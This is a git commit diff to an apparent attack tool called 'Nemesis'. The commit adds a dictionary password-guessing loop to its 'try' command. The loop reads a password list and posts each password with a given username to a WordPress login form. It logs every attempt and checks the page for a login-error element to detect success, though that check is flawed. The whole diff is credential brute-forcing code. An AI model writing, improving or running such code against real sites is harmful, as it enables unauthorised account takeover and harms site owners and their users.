ae5886b0c475ed04185ca141de1d3f8a98816156
Roger Spielmann <drummer23@braveheart.ch>
2017-07-11 19:10:24 +0200

    adds passwords implementation to try command

--- src/Nemesis/Command/TryCommand.php
+++ src/Nemesis/Command/TryCommand.php
@@ -21,7 +21,17 @@ class TryCommand extends Command {
 			  'url',
 			  InputArgument::REQUIRED,
 			  'Login Request Url'
+			  )->addArgument(
+			  'username',
+			  InputArgument::REQUIRED,
+			  'Username'
 			  )
+			->addArgument(
+				'pwlist',
+				InputArgument::OPTIONAL,
+				'The PW List'
+			)
+			
 		;
   	}
 
@@ -31,12 +41,30 @@ class TryCommand extends Command {
 		$dom = new \DOMDocument();
 
         $url = $input->getArgument('url');
+        $user = $input->getArgument('username');
 
 
+		//Read PW List
+		$inpFileName = $input->getArgument('pwlist');
+		if (!$inpFileName) {
+			$inpFileName = __DIR__ . '/../../../test/passwords.txt';
+		}
+
+		$logger->info('Reading ' . $inpFileName);
+		$handle = fopen($inpFileName, "r");
+		$contents = fread($handle, filesize($inpFileName));
+		fclose($handle);
+
+		$passwords = explode(PHP_EOL, $contents);
+
+
+		//Prepare Request
 
 		// Get cURL resource
 		$curl = curl_init();
 		// Set some options - we are passing in a useragent too here
+
+		//HARDCODED wordpress example
 		curl_setopt_array($curl, array(
 			CURLOPT_RETURNTRANSFER => 1,
 			CURLOPT_URL => $url,
@@ -50,33 +78,52 @@ class TryCommand extends Command {
 		));
 
 
-		$logger->info('Send Request to ' . $url);
+		$logger->info('Send Request to ' . $url . ' using user/pw ...');
+
+
+		foreach($passwords as $password) {
+
+			curl_setopt($curl, CURLOPT_POSTFIELDS, array(
+				'wp-submit' => 'Anmelden',
+				'log' => $user,
+				'pwd' => $password
+			));
+
+			$logger->info("$user/$password");
 
 
 
-		// Send the request & save response to $resp
-		$resp = curl_exec($curl);
+			// Send the request & save response to $resp
+			$resp = curl_exec($curl);
 
+			if (empty($resp)) {
+				$logger->info("->Login succeeded!!!! ($user/$password)");
+				break;
+				//var_dump(trim($element->nodeValue));
+			}
+
+
+
+			//$logger->debug("Analyze Response from Server");
+
+
+			$dom->loadHTML($resp);
+			$xpath = new \DOMXPath($dom);
+
+			//HARDCODED wordpress example
+			$elements = $xpath->query("/html/body/div/div[@id='login_error']");
+
+
+			if (count($elements) < 0) {
+				$logger->info("->Login succeeded!!!! ($user/$password)");
+				break;
+				//var_dump(trim($element->nodeValue));
+			}
+
+		}
 
 		// Close request to clear up some resources
 		curl_close($curl);
-
-		$logger->info("Analyze Response from Server");
-
-
-		$dom->loadHTML($resp);
-		$xpath = new \DOMXPath($dom);
-
-		// example 2: for node data in a selected id
-		$elements = $xpath->query("/html/body/div/div[@id='login_error']");
-
-
-		foreach ($elements as $element) {
-			$logger->info("Login failed");
-			var_dump(trim($element->nodeValue));
-		}
-
-
 
 
 		$logger->info('Done');
